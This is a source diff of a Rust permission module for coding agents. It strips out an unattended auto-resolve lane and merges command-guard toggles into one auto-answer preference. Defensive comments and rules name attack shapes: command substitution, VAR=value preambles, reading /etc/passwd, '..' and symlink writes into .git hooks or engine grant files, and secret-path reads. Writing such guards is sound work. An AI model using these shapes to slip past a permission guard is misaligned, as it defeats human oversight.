@@ -21,25 +21,20 @@
 
 use std::collections::{HashMap, HashSet};
 use std::path::Path;
-use std::sync::{Arc, Mutex, RwLock};
+use std::sync::Mutex;
 use uuid::Uuid;
 
 use crate::api::SharedEngine;
-use crate::core::permission_wait::{workspace_permission_wait, PermissionWait};
 use crate::engine::claude_code::{GrantOffer, CLAUDE_CODE_COMMAND_TOOL, CODEX_COMMAND_TOOL};
 use crate::engine::command_guard::{
-    self, unwrap_shell_command, CommandSite, JudgeInput, RiskLane, SideEffectCategory,
-    StaticVerdict, TrustedHeads,
+    self, unwrap_shell_command, CommandSite, JudgeInput, RiskLane, StaticVerdict, TrustedHeads,
 };
 use crate::engine::command_judge::JudgeVerdict;
 use crate::engine::event_bus::{BusEvent, EventBus};
-use crate::engine::thread_events::{
-    ActorMode, EngineReason, EventMeta, MessageOrigin, ThreadDirection, ThreadEvent,
-};
+use crate::engine::thread_events::{EventMeta, MessageOrigin, ThreadEvent};
 use crate::engine::trusted_repo_scripts::trusted_repo_scripts;
 use crate::engine::LucidosEngine;
 use crate::llm::tool_names as tn;
-use crate::triggers::TriggerConfig;
 
 /// User-facing reason on a denied permission. Surfaces in the response body
 /// returned to CC's MCP middleware and in the persisted `Resolved` event.
@@ -87,46 +82,9 @@ pub const PERSISTED_ALLOW_REASON: &str = "Allowed by this workspace's coding-age
 pub const WORKTREE_WRITE_ALLOW_REASON: &str =
     "Auto-allowed: file write inside this session's own worktree";
 
-/// Reason on an attended auto-ALLOW of a coding-agent command the command
-/// guard allowed (see [`attended_command_allowed`]).
+/// Reason on an auto-ALLOW of a coding-agent command the command guard allowed
+/// (see [`guard_allows_command`]).
 pub const COMMAND_GUARD_ALLOW_REASON: &str = "Auto-allowed: the command guard allowed this command";
-
-/// Reason on an unattended auto-ALLOW of a benign in-workspace request. The
-/// coding-agent session was launched by a trigger with no human to answer a
-/// card, so the engine resolves immediately.
-pub const UNATTENDED_ALLOW_BENIGN_REASON: &str =
-    "Auto-allowed: benign in-workspace operation (unattended trigger session)";
-
-/// Reason on an unattended auto-ALLOW of an irreversible side-effect whose
-/// category is covered by the originating trigger's side-effect grant.
-pub const UNATTENDED_ALLOW_GRANTED_REASON: &str =
-    "Auto-allowed: covered by the trigger's side-effect grant";
-
-/// Reason on an unattended auto-DENY of a catastrophic command, denied
-/// regardless of any grant (the command guard's hard deny-list).
-pub const UNATTENDED_DENY_CATASTROPHIC_REASON: &str =
-    "Auto-denied: catastrophic operation, never permitted unattended";
-
-/// Reason on an unattended auto-DENY of a [`RequestVerdict::Unclassified`]
-/// request. Names what the guard refused so the run is diagnosable from the
-/// agent's own failure report, and says how to get the work done anyway.
-pub const UNATTENDED_DENY_UNCLASSIFIED_REASON: &str =
-    "Auto-denied: this coding-agent session runs unattended, and the command guard's static pass \
-     refused to settle this request as safe. It refuses a command whose head is not what runs, \
-     or not all of it: command substitution, a code-injecting VAR=value preamble, a \
-     path-qualified command head (./x, bin/x), a redirect or a write outside the workspace, an \
-     executable git config or git output flag, and a payload it could not read. It also refuses \
-     a file write into a .git directory, or into the engine's .lucidos directory outside its \
-     worktrees and tmp: write your own worktree instead. Retry with a \
-     shape the guard can read: a bare command head, no substitution, and any output kept inside \
-     the workspace. To read a file outside the workspace use cat, head or grep, which stay on \
-     the safe fast path.";
-
-/// Reason on a parked unattended card nobody answered within its permission
-/// wait. Its prefix differs from the immediate unattended deny's, so the card
-/// never claims nobody was there to ask.
-pub const UNATTENDED_WAIT_EXPIRED_REASON: &str =
-    "Auto-denied: nobody answered this permission card within its permission wait";
 
 /// What a pending card's waiters receive when it ends. Shared by all three
 /// permission lanes.
@@ -483,402 +441,18 @@ async fn hydrate_session_allows(
     }
 }
 
-/// Whether a coding-agent session has a human reachable to answer a permission
-/// card. [`resolve_attend_mode`] decides it by walking the spawn tree to its
-/// root. A human act on the way, or a human device at the root, renders a card
-/// and waits. Otherwise an engine origin at the root resolves from the grant,
-/// and parks a card only as [`prompt_coding_agent_permission`] describes.
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum AttendMode {
-    /// A human is reachable at the root of the spawn tree: render a card and
-    /// wait indefinitely.
-    Interactive,
-    /// Nobody is watching. `grant` is the originating trigger's side-effect
-    /// grant and `wait` its permission wait. Both are empty when the root is
-    /// not a scheduler-fired trigger, and an empty `wait` reads the workspace
-    /// preference.
-    Unattended {
-        grant: Vec<SideEffectCategory>,
-        wait: Option<PermissionWait>,
-    },
-}
-
-impl AttendMode {
-    /// Unattended, lending no grant and naming no wait.
-    const UNATTENDED_UNGRANTED: Self = Self::Unattended {
-        grant: Vec::new(),
-        wait: None,
-    };
-}
-
-/// Hard cap on the spawn-tree walk so a malformed parent chain (or a cycle) can
-/// never loop forever. Real spawn trees are shallow; a chain this deep is
-/// almost certainly automated, so the cap-exceeded fallback is `Unattended`.
-const MAX_ANCESTRY_HOPS: usize = 16;
-
-/// Read a thread's *originating* `MessageOrigin` — the earliest event that
-/// carries one, among the spawn-defining event types. `TriggerStarted` (a direct
-/// scheduler-fired thread) and `MessageReceived` (chat or an agent-spawned
-/// sub-thread) both stamp a `MessageOrigin` into `payload->'origin'`. Returns
-/// `None` when no such event carries an origin (legacy rows / odd threads),
-/// which the caller treats as interactive (preserve the pre-existing behavior).
-///
-/// Also returns that row's `parent_thread_id`, the *callback linkage*, which is
-/// a strictly narrower thing than the origin: a `relation: "top"` spawn and a
-/// parent's child follow-up both stamp a `ThreadLink` origin with NO linkage.
-/// `resolve_attend_mode` walks up only where the linkage exists, so attribution
-/// alone never carries a trigger's grant across a boundary the user asked to be
-/// independent.
-async fn fetch_thread_origin_and_linkage(
-    pool: &sqlx::PgPool,
-    thread_id: Uuid,
-) -> Option<(MessageOrigin, Option<Uuid>)> {
-    let row: Result<Option<(serde_json::Value, Option<Uuid>)>, sqlx::Error> = sqlx::query_as(
-        "SELECT payload->'origin', (payload->>'parent_thread_id')::uuid FROM events \
-         WHERE thread_id = $1 \
-           AND event_type IN ('TriggerStarted', 'MessageReceived') \
-           AND payload ? 'origin' \
-           AND payload->'origin' != 'null'::jsonb \
-         ORDER BY sequence ASC LIMIT 1",
-    )
-    .bind(thread_id)
-    .fetch_optional(pool)
-    .await;
-    match row {
-        Ok(Some((v, parent_thread_id))) => serde_json::from_value::<MessageOrigin>(v)
-            .ok()
-            .map(|origin| (origin, parent_thread_id)),
-        Ok(None) => None,
-        Err(e) => {
-            crate::log!(
-                "[CCPermission] fetch_thread_origin_and_linkage failed for {}: {}",
-                thread_id,
-                e
-            );
-            None
-        }
-    }
-}
-
-/// Whether a `ChildThreadDetached` names `thread_id`. An unreadable answer
-/// counts as moved, so a database error asks a human rather than lending a
-/// trigger's grant.
-async fn was_moved_to_top_level(pool: &sqlx::PgPool, thread_id: Uuid) -> bool {
-    sqlx::query_scalar(
-        "SELECT EXISTS (SELECT 1 FROM events \
-         WHERE aggregate = 'thread' AND event_type = 'ChildThreadDetached' \
-           AND payload->>'child_thread_id' = $1::text)",
-    )
-    .bind(thread_id)
-    .fetch_one(pool)
-    .await
-    .unwrap_or_else(|e| {
-        crate::log!(
-            "[CCPermission] Could not read whether {} was moved to top level: {}",
-            thread_id,
-            e
-        );
-        true
-    })
-}
-
-/// Whether a human has written or answered a question in `thread_id`: a
-/// `MessageReceived` with a human origin, or a `UserQuestionAnswered` with a
-/// human actor. An unreadable answer counts as a human, so a database error
-/// asks rather than lending a trigger's grant.
-async fn human_acted_in(pool: &sqlx::PgPool, thread_id: Uuid) -> bool {
-    let rows: Result<Vec<serde_json::Value>, sqlx::Error> = sqlx::query_scalar(
-        "SELECT CASE event_type WHEN 'MessageReceived' THEN payload->'origin' \
-                                ELSE payload->'actor' END \
-         FROM events \
-         WHERE thread_id = $1 \
-           AND ((event_type = 'MessageReceived' AND payload ? 'origin') \
-             OR (event_type = 'UserQuestionAnswered' AND payload ? 'actor'))",
-    )
-    .bind(thread_id)
-    .fetch_all(pool)
-    .await;
-    match rows {
-        Ok(actors) => actors.into_iter().any(|actor| {
-            serde_json::from_value::<MessageOrigin>(actor)
-                .is_ok_and(|origin| origin.mode() == ActorMode::Human)
-        }),
-        Err(e) => {
-            crate::log!(
-                "[CCPermission] Could not read whether a human acted in {}: {}",
-                thread_id,
-                e
-            );
-            true
-        }
-    }
-}
-
-/// Whether a human queued every member of the lane batch `thread_id` resolves.
-/// An agent can apply its own change, so the reason alone never proves that
-/// the owner pressed Apply. A thread that is no lane thread, an empty batch,
-/// and a failed read all answer no.
-async fn humans_queued_lane_batch(pool: &sqlx::PgPool, thread_id: Uuid) -> bool {
-    let queuers: Result<Vec<Option<serde_json::Value>>, sqlx::Error> = sqlx::query_scalar(
-        "WITH batch AS ( \
-             SELECT payload->'data'->'members' AS members FROM events \
-             WHERE event_type = 'LaneBatchStarted' \
-               AND payload->'data'->>'lane_thread_id' = $1 \
-             ORDER BY sequence DESC LIMIT 1) \
-         SELECT (SELECT q.payload->'actor' FROM events q \
-                 WHERE q.event_type = 'ChangeQueued' \
-                   AND q.payload->>'change_id' = m->>'change_id' \
-                 ORDER BY q.sequence DESC LIMIT 1) \
-         FROM batch, jsonb_array_elements(batch.members) AS m",
-    )
-    .bind(thread_id.to_string())
-    .fetch_all(pool)
-    .await;
-    match queuers {
-        Ok(queuers) => {
-            !queuers.is_empty()
-                && queuers.into_iter().all(|actor| {
-                    actor
-                        .and_then(|a| serde_json::from_value::<MessageOrigin>(a).ok())
-                        .is_some_and(|origin| origin.mode() == ActorMode::Human)
-                })
-        }
-        Err(e) => {
-            crate::log!(
-                "[CCPermission] Could not read who queued lane thread {}: {}",
-                thread_id,
-                e
-            );
-            false
-        }
-    }
-}
-
-/// The attend mode of `thread_id`, which the engine started for `reason`.
-///
-/// A reason whose thread exists because the owner acted is `Interactive`: the
-/// owner confirmed a plugin install, or handed off. A lane thread is
-/// `Interactive` only when a human queued its whole batch. A reason the engine
-/// raises on its own stays `Unattended`, and a trigger's own run keeps that
-/// trigger's grant and wait. The match names every variant, so a new reason
-/// fails to compile until someone classifies it.
-async fn attend_mode_of_engine_reason(
-    pool: &sqlx::PgPool,
-    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
-    thread_id: Uuid,
-    reason: &EngineReason,
-) -> AttendMode {
-    match reason {
-        EngineReason::MergeConflict => {
-            if humans_queued_lane_batch(pool, thread_id).await {
-                AttendMode::Interactive
-            } else {
-                AttendMode::UNATTENDED_UNGRANTED
-            }
-        }
-        EngineReason::Scheduler { trigger_id, .. } => trigger_configs
-            .read()
-            .ok()
-            .and_then(|m| {
-                m.get(trigger_id).map(|c| AttendMode::Unattended {
-                    grant: c.side_effect_grant.clone(),
-                    wait: c.permission_wait,
-                })
-            })
-            .unwrap_or(AttendMode::UNATTENDED_UNGRANTED),
-        EngineReason::MainCheckRed
-        | EngineReason::MainCheckFlaky
-        | EngineReason::PluginAutoUpdate { .. } => AttendMode::UNATTENDED_UNGRANTED,
-        EngineReason::HardenRetrigger
-        | EngineReason::MissingHardening
-        | EngineReason::MissingPlan
-        | EngineReason::ContextCeiling
-        | EngineReason::SuccessorSession
-        | EngineReason::PluginSetup { .. }
-        | EngineReason::PluginUpstreamProposal { .. }
-        | EngineReason::StaleSession
-        | EngineReason::ArchivedBranchWork
-        | EngineReason::UnmergedIntegratedWork
-        | EngineReason::SuccessorResidue
-        | EngineReason::ContinuationStarted
-        | EngineReason::OrphanRecovery
-        | EngineReason::EventWait { .. }
-        | EngineReason::CacheKeepAlive => AttendMode::Interactive,
-    }
-}
-
-/// Decide whether this coding-agent session is interactive or unattended, and
-/// what side-effect grant and permission wait an unattended one inherits. Walks the spawn tree from
-/// `thread_id` up to its root through the persisted `MessageOrigin` chain.
-/// At every thread on the way, a human who wrote or answered a question there
-/// (see [`human_acted_in`]) gives `Interactive` before its origin is read.
-/// Otherwise the thread's originating origin decides:
-///
-///   * a `Device`, a human-mode `Api`, or any `Workspace` gives `Interactive`.
-///     A `Workspace` origin is a top spawn through `caller_*`: the CLI's, or
-///     one engine calling another. It lends nothing.
-///   * a scheduler origin gives `Unattended` with that trigger's
-///     `side_effect_grant` and `permission_wait`, read from the in-memory
-///     registry that boot rebuilds from events.
-///   * an engine origin whose thread exists because the owner acted (a lane
-///     batch a human queued, a handoff, a plugin setup) gives `Interactive`.
-///     One the engine raised alone, like a main check's fix thread, gives
-///     `Unattended` with an empty grant and no wait
-///     ([`attend_mode_of_engine_reason`]).
-///   * any other non-human origin gives `Unattended` with an empty grant and
-///     no wait.
-///   * a `ThreadLink { direction: Parent }` **whose event also carries the
-///     `parent_thread_id` callback linkage** hops to the parent and continues.
-///     A `ThreadLink` without linkage is attribution only. It names who
-///     launched the thread for the route popover, and deliberately does NOT
-///     lend that thread's attend mode or grant. Anything unclassifiable gives
-///     `Interactive`, so an independent spawn asks a human.
-///
-/// Everything derives from already-persisted events plus the trigger registry,
-/// with no new persistence and no spawn-time plumbing. A user-rooted tree stays
-/// interactive even when an agent spawned the leaf thread.
-pub async fn resolve_attend_mode(
-    pool: &sqlx::PgPool,
-    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
-    thread_id: Uuid,
-) -> AttendMode {
-    let mut current = thread_id;
-    let mut seen: HashSet<Uuid> = HashSet::new();
-    for _ in 0..MAX_ANCESTRY_HOPS {
-        if !seen.insert(current) {
-            break; // cycle guard, which a real tree never trips
-        }
-        // A thread moved to top level left its old tree (ADR 0278). Its spawn
-        // event still names the old parent, and events are never rewritten,
-        // so the walk stops here and a human answers. So it does where a human
-        // has already written or answered: that human is reachable.
-        if was_moved_to_top_level(pool, current).await || human_acted_in(pool, current).await {
-            return AttendMode::Interactive;
-        }
-        let Some((origin, callback_linkage)) = fetch_thread_origin_and_linkage(pool, current).await
-        else {
-            // No recorded origin, so stay interactive rather than
-            // auto-resolving a thread we cannot classify.
-            return AttendMode::Interactive;
-        };
-        match origin {
-            MessageOrigin::Device { .. } => return AttendMode::Interactive,
-            MessageOrigin::Api {
-                mode,
-                source_thread_id,
-                ..
-            } => match (mode, source_thread_id) {
-                (ActorMode::Human, _) => return AttendMode::Interactive,
-                (_, Some(parent)) => {
-                    current = parent;
-                }
-                (_, None) => return AttendMode::UNATTENDED_UNGRANTED,
-            },
-            // A top spawn from the CLI or another engine. Like a
-            // `ThreadLink` without linkage it is independent of its caller, so
-            // the walk stops and a human answers, whoever the caller was.
-            MessageOrigin::Workspace { .. } => return AttendMode::Interactive,
-            MessageOrigin::ThreadLink { direction, .. } => {
-                // Only a Parent link means "the linked thread spawned me". A
-                // Child callback should never be a thread's originating origin,
-                // so treat it as non-human.
-                if direction != ThreadDirection::Parent {
-                    return AttendMode::UNATTENDED_UNGRANTED;
-                }
-                // Hop via the LINKAGE, not the origin's `thread_id`. The two
-                // name the same thread on every row the engine writes. But this
-                // walk decides privilege, and `parent_thread_id` owns
-                // parent-ness while the origin owns display. Absent linkage is a
-                // top-level spawn, which names its spawning thread for the
-                // popover but is NOT in that thread's tree. The walk stops there
-                // rather than inheriting a trigger's grant.
-                match callback_linkage {
-                    Some(parent) => current = parent,
-                    None => return AttendMode::Interactive,
-                }
-            }
-            MessageOrigin::Engine { reason } => {
-                return attend_mode_of_engine_reason(pool, trigger_configs, current, &reason).await;
-            }
-            // An agent authored it, so nobody is attending. Not expected as an
-            // ORIGINATING origin: the variant is stamped on what an agent
-            // wrote, and a thread starts from what a caller sent. Classified
-            // anyway rather than left unclassifiable, because "an LLM decided"
-            // is the unattended case exactly, and it lends no grant.
-            MessageOrigin::Agent { .. } => return AttendMode::UNATTENDED_UNGRANTED,
-            // A webhook is an external caller, so it lends no grant at all. A
-            // trigger that fires on the event it emitted carries its OWN grant,
-            // and arrives here as `Engine { Scheduler }` rather than this.
-            MessageOrigin::Webhook { .. } | MessageOrigin::System => {
-                return AttendMode::UNATTENDED_UNGRANTED
-            }
-        }
-    }
-    // Depth or cycle exceeded. A chain this deep is automated, so never hang.
-    AttendMode::UNATTENDED_UNGRANTED
-}
-
-/// Static classification of one coding-agent permission request, deciding how
-/// an unattended session resolves it. Deterministic: it reuses the command
-/// guard's static passes and never the LLM judge, because the permission path
-/// must not be able to stall.
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum RequestVerdict {
-    /// Benign in-workspace work — allow even with an empty grant.
-    Benign,
-    /// A catastrophic, irreversible operation — deny regardless of any grant.
-    Catastrophic,
-    /// An irreversible real-world side-effect of this category — allow only when
-    /// the trigger's grant contains it.
-    SideEffect(SideEffectCategory),
-    /// The static pass REFUSED to settle this request rather than merely not
-    /// recognising it. `command_guard::FastPathDecline::Refusal` owns the full
-    /// list. A payload that could not be read, and a file write into engine
-    /// state ([`writes_engine_state`]), join it here.
-    ///
-    /// Denied unattended, whatever the grant. Nobody is watching, which is the
-    /// strongest reason to refuse a shape the guard cannot see through, not a
-    /// reason to run it. A merely UNRECOGNISED head (`cargo build`) is still
-    /// [`RequestVerdict::Benign`], because a missing allowlist entry costs
-    /// latency rather than safety.
-    ///
-    /// The refusal set reaches further than an attack shape, and that cost is
-    /// accepted rather than overlooked: a `/tmp` log redirect, a
-    /// `./scripts/x.sh` head, and `sort /etc/passwd` are all refusals, so an
-    /// unattended session is denied them and retries per
-    /// [`UNATTENDED_DENY_UNCLASSIFIED_REASON`]. A deny costs one request, not
-    /// the run (ADR 0002).
-    Unclassified(Unsettled),
-}
-
-/// Why the static pass would not settle a request. Only a refused shape may
-/// park an unattended card (ADR 0628).
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum Unsettled {
-    /// `command_guard::FastPathDecline::Refusal`: a human can read the command
-    /// and judge it.
-    Refused,
-    /// A command payload the engine could not read. Nobody can judge it.
-    Unreadable,
-    /// A file write into engine state ([`writes_engine_state`]). It outlives
-    /// the session, so an unattended run never takes one.
-    EngineState,
-}
-
 /// What a coding-agent *command* request carries. Codex raises these as
 /// `command_execution`; Claude Code as `Bash`.
 ///
-/// The three cases are not two. "Not a command request" and "a command request
-/// whose payload I could not read" used to collapse into one `None`. The
-/// caller then fell through to its benign default, and an unattended session
-/// auto-allowed a command it had never seen the text of.
+/// The three cases are not two. A command whose payload could not be read must
+/// never take the fall-through of a request that is no command at all.
 enum CommandPayload<'a> {
     /// Not a command request at all.
     NotACommand,
     /// The command text.
     Known(&'a str),
     /// A command request whose `command` field is missing, not a string, or
-    /// empty. Nothing can be classified, so it is denied unattended.
+    /// empty. Nothing can be classified, so it cards.
     Unresolved,
 }
 
@@ -1000,7 +574,7 @@ fn path_outside_workspace(path: &str, workspace_path: &Path) -> bool {
     // A lexical prefix check is escapable, which is why the sibling
     // `path_inside_worktree` resolves both sides. A symlink inside the
     // workspace pointing outside makes the path read as contained while the
-    // write lands elsewhere, and the unattended lane auto-allows that. Resolve
+    // write lands elsewhere. Resolve
     // here too, but only to OVERRIDE a lexical "inside". A dangling link on the
     // chain reads as outside, since the write follows it somewhere unknown.
     // Otherwise, when either side fails to resolve we keep the lexical answer.
@@ -1014,55 +588,6 @@ fn path_outside_workspace(path: &str, workspace_path: &Path) -> bool {
         (Ok(root), ExistingPrefix::Resolved(resolved)) => !resolved.starts_with(&root),
         _ => false,
     }
-}
-
-/// True when a write to `path` changes what the engine runs rather than work
-/// the user reviews:
-///
-///   * a `.git` directory, where a hook runs on the engine's next commit;
-///   * the engine's runtime directory outside its worktrees and scratch tree.
-///     It holds the grant files, the `lucidos` CLI and the backup key.
-///
-/// Checked on the input path with each `..` folded away, then on the resolved
-/// path. So neither a `..` nor a symlink in the workspace hides the target. A
-/// relative path is placed against the workspace root, the one reading that
-/// can reach the engine's own directory.
-fn writes_engine_state(path: &str, workspace_path: &Path) -> bool {
-    let p = workspace_path.join(path);
-    let p = p.as_path();
-    let in_engine_state = |target: &Path, root: &Path| {
-        target.strip_prefix(root).is_ok_and(has_git_component)
-            || (target.starts_with(crate::core::grants_dir(root))
-                && !target.starts_with(root.join(crate::paths::WORKTREES_SUBPATH))
-                && !target.starts_with(root.join(crate::core::TMP_DIR)))
-    };
-    if in_engine_state(&without_parent_dirs(p), workspace_path) {
-        return true;
-    }
-    match (
-        std::fs::canonicalize(workspace_path),
-        canonical_existing_prefix(p),
-    ) {
-        (Ok(root), ExistingPrefix::Resolved(resolved)) => in_engine_state(&resolved, &root),
-        _ => false,
-    }
-}
-
-/// `p` with each `..` folded into its parent, as text. Only a lower bound on
-/// where a write lands, because a symlink before the `..` moves it; the
-/// resolved check covers that.
-fn without_parent_dirs(p: &Path) -> std::path::PathBuf {
-    let mut out = std::path::PathBuf::new();
-    for component in p.components() {
-        match component {
-            std::path::Component::ParentDir => {
-                out.pop();
-            }
-            std::path::Component::CurDir => {}
-            other => out.push(other),
-        }
-    }
-    out
 }
 
 fn has_git_component(p: &Path) -> bool {
@@ -1199,13 +724,8 @@ enum CommandStatic {
     Verdict(StaticVerdict),
 }
 
-/// Run the command guard's static pass over a coding-agent command request.
-///
-/// Shared by the two lanes that classify one: the unattended auto-resolve
-/// ([`classify_coding_agent_request`]) and the attended escalation gate
-/// ([`attended_command_allowed`]). They differ in what they do with the
-/// verdict, and in one input: only the attended gate passes `trusted` repo
-/// scripts. The unattended lane passes [`TrustedHeads::NONE`].
+/// Run the command guard's static pass over a coding-agent command request,
+/// for the escalation gate ([`guard_allows_command`]).
 ///
 /// Codex wraps every command as `/bin/zsh -lc '<script>'`, so the inner script
 /// is what gets classified. Without that a wrapped side-effect hides behind
@@ -1240,120 +760,6 @@ fn static_command_verdict_at(
     }
 }
 
-/// Classify one coding-agent permission request for the unattended decision.
-///
-/// * A command request reuses the command guard's STATIC classification,
-///   normalized onto its bash tool vocabulary. The deny-list, the allowlist and
-///   the static fallback all apply, with no LLM judge. An in-workspace
-///   destruction counts as benign here, because it is recoverable. An
-///   irreversible side-effect carries its category for the grant check. A
-///   shape the fast path REFUSED is [`RequestVerdict::Unclassified`], which
-///   denies; a merely unrecognised head still runs.
-/// * A file request is benign only when EVERY target is in-workspace. **Any**
-///   target outside the workspace root makes the whole request out-of-workspace
-///   destruction, which is grant-gated. A `file_change` whose targets are
-///   unknown is grant-gated too: codex raises that approval because the patch
-///   escaped its sandbox, so "I could not see the paths" is not permission.
-///   A target that [`writes_engine_state`] is [`RequestVerdict::Unclassified`],
-///   because no grant names it and a write there outlives the session.
-/// * A file read of a secret path ([`file_tool_reads_secret`]) is a
-///   [`SideEffectCategory::SecretRead`], which no grant allows.
-/// * Anything else is benign.
-pub fn classify_coding_agent_request(
-    tool_name: &str,
-    input: &serde_json::Value,
-    workspace_path: &Path,
-) -> RequestVerdict {
-    classify_coding_agent_request_at(tool_name, input, workspace_path, Some(workspace_path))
-}
-
-fn classify_coding_agent_request_at(
-    tool_name: &str,
-    input: &serde_json::Value,
-    workspace_path: &Path,
-    root: Option<&Path>,
-) -> RequestVerdict {
-    match static_command_verdict_at(tool_name, input, &TrustedHeads::NONE, root) {
-        // A command we cannot read is the opposite of benign. The whole
-        // classification below reads the command text, so there is nothing
-        // left to decide on.
-        CommandStatic::Unreadable => return RequestVerdict::Unclassified(Unsettled::Unreadable),
-        CommandStatic::Verdict(verdict) => {
-            let destroys_from_cwd = || destroys_from_request_cwd(tool_name, input, workspace_path);
-            return match verdict {
-                StaticVerdict::Settled(RiskLane::Catastrophic) => RequestVerdict::Catastrophic,
-                StaticVerdict::SettledIrreversible(category) => {
-                    RequestVerdict::SideEffect(category)
-                }
-                StaticVerdict::Settled(_) if destroys_from_cwd() => {
-                    RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
-                }
-                // `static_classify` only ever settles Safe/Catastrophic; map the
-                // rest defensively to benign.
-                StaticVerdict::Settled(_) => RequestVerdict::Benign,
-                StaticVerdict::NeedsJudge(ji) => {
-                    let site = CommandSite::TextOnly {
-                        root: Some(workspace_path),
-                    };
-                    let judged = command_guard::fallback_classify(&ji, site);
-                    match judged.lane {
-                        RiskLane::Catastrophic => RequestVerdict::Catastrophic,
-                        // Ahead of the category arm on purpose. The fast path
-                        // refused this shape rather than just missing its
-                        // head. A category the fallback derived from the same
-                        // text is not something to check a grant against.
-                        _ if ji.fast_path_refused => {
-                            RequestVerdict::Unclassified(Unsettled::Refused)
-                        }
-                        RiskLane::IrreversibleDanger => RequestVerdict::SideEffect(
-                            judged.category.unwrap_or(SideEffectCategory::Other),
-                        ),
-                        RiskLane::Safe | RiskLane::ReversibleDanger if destroys_from_cwd() => {
-                            RequestVerdict::SideEffect(
-                                SideEffectCategory::OutOfWorkspaceDestruction,
-                            )
-                        }
-                        RiskLane::Safe | RiskLane::ReversibleDanger => RequestVerdict::Benign,
-                    }
-                }
-            };
-        }
-        CommandStatic::NotACommand => {}
-    }
-    if file_tool_reads_secret(tool_name, input) {
-        return RequestVerdict::SideEffect(SideEffectCategory::SecretRead);
-    }
-    match coding_agent_file_targets(tool_name, input) {
-        FileTargets::Known(targets) => {
-            // First, so a grant for out-of-workspace writes never covers one:
-            // `<ws>/.lucidos/worktrees/t/../../cc-allowed-tools` is both.
-            if targets
-                .iter()
-                .any(|path| writes_engine_state(path, workspace_path))
-            {
-                return RequestVerdict::Unclassified(Unsettled::EngineState);
-            }
-            if targets
-                .iter()
-                .any(|path| path_outside_workspace(path, workspace_path))
-            {
-                return RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction);
-            }
-            return RequestVerdict::Benign;
-        }
-        // A file write we cannot place is the opposite of benign, so it is
-        // grant-gated rather than waved through. Codex only asks about a patch
-        // that already escaped its sandbox. Falling through to the benign
-        // default below would auto-allow every out-of-workspace write in an
-        // unattended session, since `grant_root` arrives `null`.
-        FileTargets::Unresolved => {
-            return RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction);
-        }
-        FileTargets::NotAFileWrite => {}
-    }
-    RequestVerdict::Benign
-}
-
 /// Claude Code's file-reading tools, whose path reaches the prompt tool when
 /// it lies outside the worktree.
 const FILE_READ_TOOLS: [&str; 3] = ["Read", "Grep", "Glob"];
@@ -1376,18 +782,17 @@ fn file_tool_reads_secret(tool_name: &str, input: &serde_json::Value) -> bool {
             .any(|glob| command_guard::mentions_secret_path(&format!("{root}/{glob}")))
 }
 
-/// Whether a classified lane lets an attended command skip its card.
+/// Whether a classified lane lets a coding-agent command skip its card.
 ///
 /// `None` is every way the classification did not land: an unreadable command,
 /// a judge that is off, has no provider, errored or timed out. It cards, which
 /// is the behavior that predates this gate.
 ///
-/// `Safe` always allows. `ReversibleDanger` allows only while
-/// `command_guard_coding_agents` resolves on (its default) under a live
-/// `command_guard`, and `reversible_allowed` carries that. The chat lane also
-/// runs `ReversibleDanger` unasked, but it snapshots the workspace on a safety
-/// ref first, and this gate has no such undo: turning the guard on accepts
-/// that trade (ADR 0005, command guard addenda). `Catastrophic` and
+/// `Safe` always allows. `ReversibleDanger` allows only under
+/// `coding_agent_auto_answer`, and `reversible_allowed` carries that. The chat
+/// lane also runs `ReversibleDanger` unasked, but it snapshots the workspace on
+/// a safety ref first. This gate has no such undo: turning auto-answer on
+/// accepts that trade (ADR 0005, command guard addenda). `Catastrophic` and
 /// `IrreversibleDanger` card whatever the flag says, and nothing here ever
 /// auto-denies.
 fn lane_allows_escalation(lane: Option<RiskLane>, reversible_allowed: bool) -> bool {
@@ -1398,53 +803,35 @@ fn lane_allows_escalation(lane: Option<RiskLane>, reversible_allowed: bool) -> b
     }
 }
 
-/// Whether the user let the command guard answer coding-agent commands.
+/// Whether the user turned on coding-agent auto-answer.
 ///
-/// Read only while the master `command_guard` is on, like the judge switch.
+/// Independent of `command_guard`: turning safety on never means asking less.
 /// An unreadable preference resolves OFF, because OFF is the card.
-async fn command_guard_covers_coding_agents(pool: &sqlx::PgPool) -> bool {
-    crate::core::prefs::COMMAND_GUARD
+async fn coding_agent_auto_answer(pool: &sqlx::PgPool) -> bool {
+    crate::core::prefs::CODING_AGENT_AUTO_ANSWER
         .try_read(pool)
         .await
         .unwrap_or(false)
-        && crate::core::prefs::COMMAND_GUARD_CODING_AGENTS
-            .try_read(pool)
-            .await
-            .unwrap_or(false)
 }
 
-/// Ask the command judge to place one ambiguous command, for the attended gate.
+/// Ask the command judge to place one ambiguous command, for the escalation
+/// gate.
 ///
 /// `Err` names why no verdict came back, and the caller cards. Deliberately NOT
-/// `fallback_classify`, which the unattended lane uses. That one reads an
-/// unrecognised head as benign, where an auto-allow here must rest on a
-/// positive verdict.
+/// `fallback_classify`, which reads an unrecognised head as benign, where an
+/// auto-allow here must rest on a positive verdict.
 ///
-/// **Both command-guard toggles gate the LLM half**, in the order
-/// `agentic_loop::run` reads them: the master `command_guard`, then the
-/// `command_guard_judge` sub-switch. The master ships off, and the Settings UI
-/// greys the sub-switch out under it. Reading the sub-switch alone would spend
-/// a model call behind an off switch the user cannot reach. The static half
-/// above asks neither, and needs no model.
-///
-/// An unreadable preference resolves OFF, because OFF is the card.
+/// Auto-answer on is consent to judge every coding-agent command, and nothing
+/// else is: the guard's own switches never let a judge answer a coding agent,
+/// so turning safety on never means asking less.
 async fn judge_escalation_lane(
     engine: &LucidosEngine,
     ji: &JudgeInput,
     thread_id: Uuid,
+    auto_answer: bool,
 ) -> Result<JudgeVerdict, String> {
-    let pool = engine.pool();
-    let guard_on = crate::core::prefs::COMMAND_GUARD
-        .try_read(pool)
-        .await
-        .unwrap_or(false);
-    if !guard_on
-        || !crate::core::prefs::COMMAND_GUARD_JUDGE
-            .try_read(pool)
-            .await
-            .unwrap_or(false)
-    {
-        return Err("the judge is off".to_string());
+    if !auto_answer {
+        return Err("auto-answer is off".to_string());
     }
     engine
         .judge_command(ji, thread_id)
@@ -1452,7 +839,7 @@ async fn judge_escalation_lane(
